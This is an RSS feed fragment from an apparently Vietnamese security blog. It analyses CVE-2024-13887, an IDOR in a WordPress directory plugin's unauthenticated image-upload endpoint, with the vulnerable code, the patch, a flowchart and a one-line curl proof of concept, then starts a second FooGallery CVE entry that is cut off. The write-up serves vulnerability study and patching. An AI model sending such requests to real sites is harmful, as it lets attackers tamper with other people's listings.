nh·∫≠p&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_wpbdp-listing-submit-image-upload&amp;#39;, array( &amp;amp;$this, &amp;#39;ajax_listing_submit_image_upload&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; l√† hook d√†nh cho t·∫•t c·∫£ ng∆∞·ªùi d√πng, k·∫øt c·∫£ ch∆∞a ƒëƒÉng nh·∫≠p. Khi c√≥ request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=wpbdp-listing-submit-image-upload&lt;/code&gt; th√¨ callback &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_listing_submit_image_upload() {&#xA;    $res = new WPBDP_AJAX_Response();&#xA;&#xA;    $listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;    ...&#xA;    $files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&#xA;    $errors = array();&#xA;&#xA;    $listing         = WPBDP_Listing::get( $listing_id );&#xA;    $slots_available = 0;&#xA;    $plan            = $listing-&amp;gt;get_fee_plan();&#xA;    if ( ! $plan ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    }&#xA;&#xA;    $slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;    if ( 0 &amp;gt;= $slots_available ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    } elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;        return $res-&amp;gt;send_error(&#xA;            sprintf(&#xA;                _nx(&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                    $slots_available,&#xA;                    &amp;#39;listing image upload&amp;#39;,&#xA;                    &amp;#39;business-directory-plugin&amp;#39;&#xA;                ),&#xA;                count( $files ),&#xA;                $slots_available&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    foreach ( $files as $i =&amp;gt; $file ) {&#xA;        $image_error   = &amp;#39;&amp;#39;;&#xA;        $attachment_id = wpbdp_media_upload(&#xA;            $file,&#xA;            true,&#xA;            true,&#xA;            array(&#xA;                &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;                &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;                &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;            ),&#xA;            $image_error&#xA;        ); // TODO: handle errors.&#xA;&#xA;        if ( $image_error ) {&#xA;            $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;        } else {&#xA;            $attachments[] = $attachment_id;&#xA;        }&#xA;    }&#xA;&#xA;    $html = &amp;#39;&amp;#39;;&#xA;    foreach ( $attachments as $attachment_id ) {&#xA;        $html .= wpbdp_render(&#xA;            &amp;#39;submit-listing-images-single&amp;#39;,&#xA;            array(&#xA;                &amp;#39;image_id&amp;#39;   =&amp;gt; $attachment_id,&#xA;                &amp;#39;listing_id&amp;#39; =&amp;gt; $listing_id,&#xA;            ),&#xA;            false&#xA;        );&#xA;    }&#xA;&#xA;    $has_images = $listing-&amp;gt;get_images( &amp;#39;ids&amp;#39; );&#xA;    $listing-&amp;gt;set_images( $attachments, true );&#xA;&#xA;    // Maybe set thumbnail if there aren&amp;#39;t already images on this listing.&#xA;    if ( ! $has_images ) {&#xA;        $image_id = reset( $attachments );&#xA;        $listing-&amp;gt;set_thumbnail_id( $image_id );&#xA;    }&#xA;&#xA;    if ( $errors ) {&#xA;        $error_msg = &amp;#39;&amp;#39;;&#xA;&#xA;        foreach ( $errors as $fname =&amp;gt; $error ) {&#xA;            $error_msg .= sprintf( &amp;#39;&amp;amp;#149; %s: %s&amp;#39;, $fname, $error ) . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;;&#xA;        }&#xA;&#xA;        $res-&amp;gt;add( &amp;#39;uploadErrors&amp;#39;, $error_msg );&#xA;    }&#xA;&#xA;    $res-&amp;gt;add( &amp;#39;is_admin&amp;#39;, wpbdp_user_is_admin() );&#xA;    $res-&amp;gt;add( &amp;#39;slots_available&amp;#39;, $slots_available );&#xA;    $res-&amp;gt;add( &amp;#39;attachmentIds&amp;#39;, $attachments );&#xA;    $res-&amp;gt;add( &amp;#39;html&amp;#39;, $html );&#xA;    $res-&amp;gt;send();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán l·∫•y &lt;code&gt;listing_id&lt;/code&gt; v√† &lt;code&gt;images&lt;/code&gt; t·ª´ request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;$files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;K·∫øt th√∫c h√†m n·∫øu plan ch∆∞a ƒë∆∞·ª£c ch·ªçn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$plan = $listing-&amp;gt;get_fee_plan();&#xA;if ( ! $plan ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#34; title=&#34;Ch·ªçn plan&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/plan.png&#34; data-sub-html=&#34;&lt;h2&gt;Plan&lt;/h2&gt;&lt;p&gt;Ch·ªçn plan&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#39; alt=&#34;Plan&#34; height=&#34;459&#34; width=&#34;705&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Ch·ªçn plan&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ ki·ªÉm tra slot c√≤n l·∫°i c√≥ th·ªÉ upload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;if ( 0 &amp;gt;= $slots_available ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;} elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;    return $res-&amp;gt;send_error(&#xA;        sprintf(&#xA;            _nx(&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                $slots_available,&#xA;                &amp;#39;listing image upload&amp;#39;,&#xA;                &amp;#39;business-directory-plugin&amp;#39;&#xA;            ),&#xA;            count( $files ),&#xA;            $slots_available&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#34; title=&#34;Slot&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/slot.png&#34; data-sub-html=&#34;&lt;h2&gt;Slot&lt;/h2&gt;&lt;p&gt;Slot&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#39; alt=&#34;Slot&#34; height=&#34;439&#34; width=&#34;509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Slot&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;slot &amp;lt;= 0&lt;/code&gt; th√¨ tr·∫£ v·ªÅ l·ªói. N·∫øu kh√¥ng, duy·ªát qua c√°c file v√† g·ªçi ƒë·∫øn &lt;code&gt;wpbdp_media_upload&lt;/code&gt; ƒë·ªÉ upload file.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $files as $i =&amp;gt; $file ) {&#xA;    $image_error   = &amp;#39;&amp;#39;;&#xA;    $attachment_id = wpbdp_media_upload(&#xA;        $file,&#xA;        true,&#xA;        true,&#xA;        array(&#xA;            &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;            &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;        ),&#xA;        $image_error&#xA;    ); // TODO: handle errors.&#xA;&#xA;    if ( $image_error ) {&#xA;        $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;    } else {&#xA;        $attachments[] = $attachment_id;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cu·ªëi c√πng h√†m s·∫Ω tr·∫£ v·ªÅ th√¥ng tin upload d·∫°ng JSON.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;br&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;l·ªó h·ªïng x·∫£y ra khi kh√¥ng c√≥ s·ª± r√†ng bu·ªôc gi·ªØa &lt;code&gt;listing_id&lt;/code&gt; v√† ng∆∞·ªùi d√πng ƒë∆∞·ª£c ph√©p th·ª±c hi·ªán upload, attacker c√≥ th·ªÉ th·ª±c hi·ªán upload images b·∫•t k√¨ th√¥ng qua vi·ªác thay ƒë·ªïi tham s·ªë &lt;code&gt;listing_id&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;B·∫£n v√° &lt;code&gt;v6.4.15&lt;/code&gt; ƒë√£ tri·ªÉn khai m·ªôt s·ªë bi·ªán ph√°p ƒë·ªÉ kh·∫Øc ph·ª•c:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#39; alt=&#34;Patch&#34; height=&#34;678&#34; width=&#34;1915&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán ki·ªÉm tra nonce b·∫±ng &lt;code&gt;check_ajax_referer&lt;/code&gt; =&amp;gt; ch·ªëng CSRF&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra owner c·ªßa listing, n·∫øu kh√¥ng ph·∫£i s·∫Ω tr·∫£ v·ªÅ l·ªói.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wpbdp_user_is_admin() &amp;amp;&amp;amp; ! $listing-&amp;gt;owned_by_user( get_current_user_id() ) ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;You do not have permission to upload images to this listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;WordPress triggers ajax_listing_submit_image_upload()&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;No authentication required (wp_ajax_nopriv_)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Extract listing_id from request&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load listing object by ID&amp;#34;]&#xA;&#xA;G --&amp;gt; H{&amp;#34;Listing has fee plan?&amp;#34;}&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Return error: select a plan&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;Calculate remaining image slots&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;slots_available &amp;gt; 0?&amp;#34;}&#xA;&#xA;K -- No --&amp;gt; L[&amp;#34;Return error: no available slots&amp;#34;]&#xA;K -- Yes --&amp;gt; M[&amp;#34;Process uploaded files&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Call wpbdp_media_upload()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Attach uploaded image to listing&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Set thumbnail if needed&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Return success response (JSON)&amp;#34;]&#xA;&#xA;Q --&amp;gt; R[&amp;#34;Image successfully attached to arbitrary listing&amp;#34;]&#xA;&#xA;R --&amp;gt; S[&amp;#34;IDOR: No ownership / permission validation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST http://localhost/wp-admin/admin-ajax.php \&#xA;  -F &amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34; \&#xA;  -F &amp;#34;listing_id=88&amp;#34; \&#xA;  -F &amp;#34;images=@/path/to/image.jpg&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng CVE-2024-13887 xu·∫•t ph√°t t·ª´ vi·ªác endpoint &lt;code&gt;wpbdp-listing-submit-image-upload&lt;/code&gt; cho ph√©p truy c·∫≠p kh√¥ng c·∫ßn x√°c th·ª±c v√† kh√¥ng ki·ªÉm tra quy·ªÅn s·ªü h·ªØu &lt;code&gt;listing_id&lt;/code&gt;. ƒêi·ªÅu n√†y cho ph√©p attacker upload h√¨nh ·∫£nh v√†o b·∫•t k·ª≥ listing h·ª£p l·ªá n√†o ch·ªâ b·∫±ng c√°ch thay ƒë·ªïi tham s·ªë ƒë·∫ßu v√†o. B·∫£n v√° 6.4.15 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch b·ªï sung ki·ªÉm tra nonce v√† x√°c th·ª±c quy·ªÅn s·ªü h·ªØu listing.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;IDOR x·∫£y ra do thi·∫øu ki·ªÉm tra quy·ªÅn s·ªü h·ªØu t√†i nguy√™n.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; l√† ƒëi·ªÉm t·∫•n c√¥ng nguy hi·ªÉm n·∫øu kh√¥ng c√≥ x√°c th·ª±c b·ªï sung.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n tin t∆∞·ªüng d·ªØ li·ªáu ƒë·∫ßu v√†o nh∆∞ &lt;code&gt;listing_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n k·∫øt h·ª£p &lt;strong&gt;authentication + authorization&lt;/strong&gt; khi x·ª≠ l√Ω AJAX endpoint.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/business-directory-plugin/vulnerability/wordpress-business-directory-plugin-plugin-6-4-14-insecure-direct-object-reference-to-listing-arbitrary-image-addition-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin &amp;lt;= 6.4.14 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-12114 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-30-cve-2024-12114/</link>
      <pubDate>Tue, 30 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-30-cve-2024-12114/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;FooGallery ‚Äì Responsive Photo Gallery, Image Viewer, Justified, Masonry &amp;amp; Carousel&lt;/strong&gt; d√†nh cho &lt;strong&gt;WordPress&lt;/strong&gt; t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Insecure Direct Object Reference&lt;/strong&gt; trong &lt;strong&gt;t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 2.4.29&lt;/strong&gt; th√¥ng qua h√†nh ƒë·ªông AJAX &lt;strong&gt;&lt;code&gt;foogallery_attachment_modal_save&lt;/code&gt;&lt;/strong&gt;, do &lt;strong&gt;thi·∫øu x√°c th·ª±c&lt;/strong&gt; ƒë·ªëi v·ªõi m·ªôt kh√≥a do ng∆∞·ªùi d√πng ki·ªÉm so√°t (&lt;strong&gt;&lt;code&gt;img_id&lt;/code&gt;&lt;/strong&gt;).&lt;br&gt;&#xA;ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c&lt;/strong&gt;, v·ªõi &lt;strong&gt;quy·ªÅn truy c·∫≠p ƒë∆∞·ª£c c·∫•p tr·ªü l√™n&lt;/strong&gt;, c√≥ th·ªÉ &lt;strong&gt;c·∫≠p nh·∫≠t n·ªôi dung c·ªßa b·∫•t k·ª≥ b√†i vi·∫øt ho·∫∑c trang n√†o&lt;/strong&gt;.&lt;br&gt;&#xA;T√°c ƒë·ªông th·ª±c s·ª± ch·ªâ x·∫£y ra khi &lt;strong&gt;thi·∫øt l·∫≠p vai tr√≤ Gallery Creator&lt;/strong&gt; ƒë∆∞·ª£c ƒë·∫∑t ·ªü m·ª©c &lt;strong&gt;th·∫•p h∆°n ‚ÄúEditor‚Äù&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-12114&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-12114&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability 